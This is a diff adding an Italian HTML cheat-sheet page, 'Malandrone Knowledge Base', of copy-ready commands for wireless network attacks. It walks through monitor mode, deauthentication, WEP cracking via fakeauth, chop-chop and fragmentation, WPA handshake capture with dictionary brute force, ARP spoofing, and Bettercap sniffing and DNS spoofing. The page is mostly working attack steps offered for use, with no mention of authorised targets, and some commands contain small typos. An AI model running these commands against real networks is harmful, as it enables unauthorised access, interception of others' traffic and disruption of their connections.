@@ -1,0 +1,428 @@
+<!DOCTYPE html>
+
+<html lang="it">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Malandrone Knowledge Base</title>
+    <link rel="stylesheet" href="styles.css">
+    <link rel="icon" href="https://avatars.githubusercontent.com/u/58426936?s=60" type="image/png">
+</head>
+
+<body>
+
+    <h1 id="page-title">WIRELESS NETWORKS ATTACKS</h1>
+
+    <br>
+	<div class="bold-text">Connettere il dispositivo USB alla macchina</div>
+
+    <div class="normal-text">
+        Collegare l'adattatore Wi-Fi USB alla macchina e verificare che
+        il sistema operativo lo abbia correttamente rilevato.
+        <br><br>
+        Per visualizzare l'elenco dei dispositivi USB collegati utilizzare
+        il comando seguente:
+    </div>
+
+    <div class="container">
+        <div class="sample" id="sample1">lsusb</div>
+        <button onclick="CopyCommand('sample1')">Copy</button>
+    </div>
+
+    <div class="normal-text">
+        Nell'elenco dei dispositivi USB verrà visualizzata una voce
+        relativa all'adattatore collegato. Ad esempio, potrebbe comparire
+        una voce analoga a:
+        <br><br>
+        TP-Link Archer T20 PLUS [RTL8821AU]
+        <br><br>
+        Il nome visualizzato può variare in base al modello dell'adattatore
+        e al chipset utilizzato.
+    </div>
+
+    <br>
+
+    <div class="bold-text">Effettuare gli aggiornamenti</div>
+
+    <div class="normal-text">
+        Prima di procedere con l'installazione del driver è consigliabile
+        aggiornare l'indice dei pacchetti e installare gli aggiornamenti
+        disponibili per il sistema.
+    </div>
+
+    <div class="container">
+        <div class="sample" id="sample2">sudo apt update</div>
+        <button onclick="CopyCommand('sample2')">Copy</button>
+    </div>
+
+    <div class="container">
+        <div class="sample" id="sample3">sudo apt upgrade</div>
+        <button onclick="CopyCommand('sample3')">Copy</button>
+    </div>
+
+    <br>
+
+    <div class="bold-text">Installare il driver</div>
+
+    <div class="normal-text">
+        Installare il pacchetto DKMS relativo al driver dell'adattatore
+        wireless. DKMS permette di gestire il modulo del kernel necessario
+        al funzionamento del dispositivo.
+    </div>
+
+    <div class="container">
+        <div class="sample" id="sample4">sudo apt-get install realtek-rtl88xxau-dkms</div>
+        <button onclick="CopyCommand('sample4')">Copy</button>
+    </div>
+
+    <br>
+
+    <div class="bold-text">Riavviare il sistema</div>
+
+    <div class="normal-text">
+        Al termine dell'installazione del driver riavviare il sistema per
+        permettere il caricamento del nuovo modulo del kernel.
+    </div>
+
+    <div class="container">
+        <div class="sample" id="sample5">sudo reboot</div>
+        <button onclick="CopyCommand('sample5')">Copy</button>
+    </div>
+
+	<div class="bold-text">Identificare le interfacce di rete</div>
+
+    <div class="normal-text">
+        Prima di effettuare qualsiasi attività è consigliabile verificare
+        quali interfacce di rete sono presenti nel sistema.
+    </div>
+
+    <div class="container">
+        <div class="sample" id="sample6">ip link</div>
+        <button onclick="CopyCommand('sample6')">Copy</button>
+    </div>
+
+    <br>
+
+    <div class="bold-text">Cambiare temporaneamente l'indirizzo MAC</div>
+
+    <div class="normal-text">
+        È possibile modificare temporaneamente il MAC address di un'interfaccia
+        di rete. La modifica viene normalmente persa al riavvio del sistema.
+        <br>
+    </div>
+
+    <div class="container">
+        <div class="sample" id="sample7">ip link set wlan0 down</div>
+        <button onclick="CopyCommand('sample7')">Copy</button>
+    </div>
+
+    <div class="container">
+        <div class="sample" id="sample8">ip link set wlan0 address 00:11:22:33:44:55</div>
+        <button onclick="CopyCommand('sample8')">Copy</button>
+    </div>
+
+    <div class="container">
+        <div class="sample" id="sample9">ip link set wlan0 up</div>
+        <button onclick="CopyCommand('sample9')">Copy</button>
+    </div>
+
+    <br>
+
+    <div class="bold-text">Verificare il nuovo indirizzo MAC</div>
+
+    <div class="container">
+        <div class="sample" id="sample10">ip link show wlan0</div>
+        <button onclick="CopyCommand('sample10')">Copy</button>
+    </div>
+
+    <br>
+
+    <div class="bold-text">Modalità monitor</div>
+
+    <div class="normal-text">
+        Per impostare la scheda wireless in modalità monitor eseguire i seguenti comandi:
+        <br>
+    </div>
+
+    <div class="container">
+        <div class="sample" id="sample11">ifconfig wlan0 down</div>
+        <button onclick="CopyCommand('sample11')">Copy</button>
+    </div>
+	<div class="container">
+        <div class="sample" id="sample12">airmon-ng check kill</div>
+        <button onclick="CopyCommand('sample12')">Copy</button>
+    </div>
+    <div class="container">
+        <div class="sample" id="sample13">iwconfig wlan0 mode monitor</div>
+        <button onclick="CopyCommand('sample13')">Copy</button>
+    </div>
+	
+    <div class="container">
+        <div class="sample" id="sample14">ifconfig wlan0 up</div>
+        <button onclick="CopyCommand('sample14')">Copy</button>
+    </div>
+
+	
+	<br>
+	
+	<div class="bold-text">Verificare la modalità dell'interfaccia</div>
+
+    <div class="container">
+        <div class="sample" id="sample15">iwconfig wlan0</div>
+        <button onclick="CopyCommand('sample15')">Copy</button>
+    </div>
+
+    <br>
+
+    <div class="bold-text">Analisi delle reti wireless con Airodump-ng</div>
+
+    <div class="normal-text">
+        Airodump-ng può essere utilizzato per
+        visualizzare le reti wireless rilevabili e raccogliere informazioni
+        radio come BSSID, canale e potenza del segnale.
+    </div>
+
+    <div class="container">
+        <div class="sample" id="sample16">airodump-ng wlan0</div>
+        <button onclick="CopyCommand('sample16')">Copy</button>
+    </div>
+
+    <br>
+
+    <div class="bold-text">Esecuzione Airodump-ng con limitazione di banda</div>
+
+    <div class="container">
+        <div class="sample" id="sample17">airodump-ng --band g wlan0</div>
+        <button onclick="CopyCommand('sample17')">Copy</button>
+    </div>
+	    <div class="container">
+        <div class="sample" id="sample18">airodump-ng --band abg wlan0</div>
+        <button onclick="CopyCommand('sample18')">Copy</button>
+    </div>
+	
+	<div class="normal-text">
+        <p>Dove:</p> <ul> <li>a → 5 GHz</li> <li>b → 2,4 GHz (802.11b)</li> <li>g → 2,4 GHz (802.11g)</li> </ul>
+    </div>
+
+    <br>
+
+    <div class="bold-text">Salvare i risultati dell'analisi</div>
+
+    <div class="normal-text">
+        Airodump-ng può salvare i risultati della scansione, saranno generati 3 file con estensione .csv, .cap (wireshark), .netxml.
+    </div>
+
+    <div class="container">
+        <div class="sample" id="sample19">airodump-ng --bssid nome_bssid --channel numero_canale --write nome_file wlan0</div>
+        <button onclick="CopyCommand('sample19')">Copy</button>
+    </div>
+
+    <br>
+	
+	<div class="bold-text">Deauthentication attack</div>
+
+    <div class="normal-text">
+        Impostare Airodump-ng in esecuzione su un'altra finestra ed eseguire il seguente comando:
+    </div>
+
+    <div class="container">
+        <div class="sample" id="sample20">aireplay-ng --deauth numero_elevato -a MAC_access_point> -c MAC_dispositivo_target -wlan0</div>
+        <button onclick="CopyCommand('sample20')">Copy</button>
+    </div>
+
+    <br>
+	
+	<div class="bold-text">Wi-fi password guessing - base</div>
+
+    <div class="normal-text">
+        Inizialmente potrebbero non esserci abbastanza pacchetti disponibili, in questo caso occorre generare inizialmente dei pacchetti:
+    </div>
+    <div class="container">
+        <div class="sample" id="sample21">aireplay-ng --fakeauth 0 -a MAC_access_point --h MAC_wlan0 wlan0</div>
+        <button onclick="CopyCommand('sample21')">Copy</button>
+    </div>
+   <div class="normal-text">
+        Dopo aver intercettato un gran numero di pacchetti con Airodump-ng e generato il file .cap eseguire:
+    </div>
+    <div class="container">
+        <div class="sample" id="sample22">aircrack-ng file.cap</div>
+        <button onclick="CopyCommand('sample22')">Copy</button>
+    </div>
+	<div class="normal-text">
+        (nella stringa ottenuta non considerare il simbolo ':')
+    </div>
+
+    <br>
+	
+	<div class="bold-text">Wi-fi password guessing - chop-chop</div>
+
+    <div class="normal-text">
+        Aprire 4 finestre del terminale eseguendo i seguenti comandi:
+    </div>
+	 <div class="normal-text"> 1a finestra:</div>
+	<div class="container">
+        <div class="sample" id="sample23">airodump-ng --bssid nome_bssid --channel numero_canale --write file_output wlan0</div>
+        <button onclick="CopyCommand('sample23')">Copy</button>
+    </div>
+	<div class="normal-text"> 2a finestra:</div>
+	<div class="container">
+        <div class="sample" id="sample24">aireplay-ng --fakeauth 0 -a MAC_access_point> --h MAC_wlan0 wlan0</div>
+        <button onclick="CopyCommand('sample24')">Copy</button>
+    </div>
+	<div class="normal-text"> 3a finestra (genera file outfile.xor):</div>
+	<div class="container">
+        <div class="sample" id="sample25">aireplay-ng --chopchop -b MAC_access_point -h MAC_wlan0 wlan0</div>
+        <button onclick="CopyCommand('sample25')">Copy</button>
+    </div>
+	<div class="normal-text"> 4a finestra (prende in input outfile.xor generato su finestra 3):</div>
+	<div class="container">
+        <div class="sample" id="sample26">packetforge-ng -0 -a MAC_access_point --h MAC_wlan0 -k 255.255.255.255 -l 255.255.255.255 -y outfile.xor -w forged_packet_outfile</div>
+        <button onclick="CopyCommand('sample26')">Copy</button>
+    </div>
+	<div class="normal-text"> Eseguire quindi:</div>
+	<div class="container">
+        <div class="sample" id="sample27">aircrack-ng forged_packet_outfile</div>
+        <button onclick="CopyCommand('sample27')">Copy</button>
+    </div>
+   
+    <br>
+	
+	<div class="bold-text">Packet injection fragmentation attack</div>
+
+    <div class="normal-text">
+        Aprire 3 finestre del terminale eseguendo i seguenti comandi:
+    </div>
+	 <div class="normal-text"> 1a finestra:</div>
+	<div class="container">
+        <div class="sample" id="sample28">airodump-ng --bssid nome_bssid --channel numero_canale --write outfile wlan0</div>
+        <button onclick="CopyCommand('sample28')">Copy</button>
+    </div>
+	<div class="normal-text"> 2a finestra:</div>
+	<div class="container">
+        <div class="sample" id="sample29">aireplay-ng --fakeauth 0 -a MAC_access_point --h MAC_wlan0 wlan0</div>
+        <button onclick="CopyCommand('sample29')">Copy</button>
+    </div>
+	<div class="normal-text"> 3a finestra:</div>
+	<div class="container">
+        <div class="sample" id="sample30">aireplay-ng --fragment -b MAC_access_point -h MAC_wlan0 wlan0</div>
+        <button onclick="CopyCommand('sample30')">Copy</button>
+    </div>
+	
+	<br>
+	
+	<div class="bold-text">Brute force Wi-fi password </div>
+	<div class="normal-text"> Step 1: creazione di un dizionario (crea un file .txt contenente tutte le stringhe contenenti tra 6 e 8 caratteri uguali a 1/2/3/a/b/c/$ nella forma a_____b):</div>
+	<div class="container">
+        <div class="sample" id="sample31">crunch 6 8 123abc$ -o outfile.txt -t a@@@@b</div>
+        <button onclick="CopyCommand('sample31')">Copy</button>
+    </div>
+	<div class="normal-text"> Step 2: cattura handshake (verrà forzato l'handshake mediante deauth):</div>
+	<div class="normal-text"> 1a finestra:</div>
+	<div class="container">
+        <div class="sample" id="sample32">airodump-ng --bssid nome_bssid --channel numero_canale --write output_file wlan0</div>
+        <button onclick="CopyCommand('sample32')">Copy</button>
+    </div>
+	<div class="normal-text"> 2a finestra:</div>
+	<div class="container">
+        <div class="sample" id="sample33">aireplay-ng --deauth 4 -a MAC_access_point -c MAC_dispositivo_target -wlan0</div>
+        <button onclick="CopyCommand('sample33')">Copy</button>
+    </div>
+	<div class="normal-text"> Step 3: test password ( in base al file .cap generato nello step 2 proverà tutte le password generate nello step 1)</div>
+	<div class="container">
+        <div class="sample" id="sample34">aircrack-ng outfile.cap -w outfile.txt wlan0</div>
+        <button onclick="CopyCommand('sample34')">Copy</button>
+    </div>
+	
+	<br>
+	
+	<div class="bold-text">Discovery della rete </div>
+	<div class="normal-text"> Per scoprire quali dispositivi sono presenti e rispondono all'interno di una rete locale, utilizzando principalmente richieste ARP:</div>
+	<div class="container">
+        <div class="sample" id="sample35">netdiscover -r IP_rete/bit_rete</div>
+        <button onclick="CopyCommand('sample35')">Copy</button>
+    </div>
+	
+	<br>
+	
+	<div class="bold-text">ARP spoofing </div>
+	<div class="normal-text"> Per inviare risposte ARP contraffatte per alterare l'associazione tra indirizzi IP e MAC address nella rete locale:</div>
+	<div class="container">
+        <div class="sample" id="sample36">arpspoof -i wlan0 -t IP_client IP_gateway </div>
+        <button onclick="CopyCommand('sample36')">Copy</button>
+    </div>
+	
+	<br>
+	
+	<div class="bold-text">Packet sniffing con Bettercap </div>
+	<div class="normal-text"> Step 1: creare uno script di sniffing denominato "spoof.cap" contenente i seguenti comandi:</div>
+	<div class="container">
+        <div class="sample" id="sample37">
+		net.probe on <br>
+		net.recon on <br>
+		set set arp.spoof.fullduplex true <br>
+		set arp.spoof.targets IP_target <br>
+		arp.spoof on <br>
+		set net.sniff.local true <br>
+		net.sniff on <br>
+		</div>
+        <button onclick="CopyCommand('sample37')">Copy</button>
+    </div>
+	<div class="normal-text"> Step 2: eseguire lo script con Bettercap:</div>
+		<div class="container">
+        <div class="sample" id="sample38">bettercap -iface wlan0 -caplet spoof.cap </div>
+        <button onclick="CopyCommand('sample38')">Copy</button>
+    </div>
+	
+	<br>
+	
+	<div class="bold-text">ARP poisoning con Bettercap </div>
+	<div class="normal-text"> Eseguire sequenzialmente i seguenti comandi per forzare l'host target ad inviare all'attaccante i dati destinati al router:</div>
+	<div class="container">
+        <div class="sample" id="sample39">
+		bettercap <br>
+		set arp.spoof.fullduplex true <br>
+		set arp.spoof.targets IP_target <br>
+		arp.spoof on <br>
+		net.show <br>
+		</div>
+        <button onclick="CopyCommand('sample39')">Copy</button>
+    </div>
+	
+	<br>
+	
+	<div class="bold-text">DNS spoofing con Bettercap </div>
+	<div class="normal-text"> Step 1: avviare il server http Apache (homepage /var/www/html/index.html):</div>
+	<div class="container">
+        <div class="sample" id="sample40">service apache2 start</div>
+        <button onclick="CopyCommand('sample40')">Copy</button>
+    </div>
+	<div class="normal-text"> Step 2: creare uno script di sniffing denominato "dnsspoof.cap" contenente i seguenti comandi:</div>
+	<div class="container">
+        <div class="sample" id="sample41">
+		dns.spoof on <br>
+		set dns.spoof.all true <br>
+		set dns.spoof.domains dominio da dirottare_1,dominio da dirottare_2 <br>
+		dns.spoof on <br>
+		</div> 
+        <button onclick="CopyCommand('sample41')">Copy</button>
+    </div>
+	<div class="normal-text"> Step 3: eseguire lo script con Bettercap:</div>
+	<div class="container">
+        <div class="sample" id="sample42">bettercap -iface wlan0 -caplet dnsspoof.cap</div>
+        <button onclick="CopyCommand('sample42')">Copy</button>
+    </div>
+	
+	<br>
+
+    <script>
+        function CopyCommand(sampleId) {
+            const textToCopy = document.getElementById(sampleId).innerText;
+
+            navigator.clipboard.writeText(textToCopy).then(function () {
+            }).catch(function (err) {
+            });
+        }
+    </script>
+
+</body>
+</html>
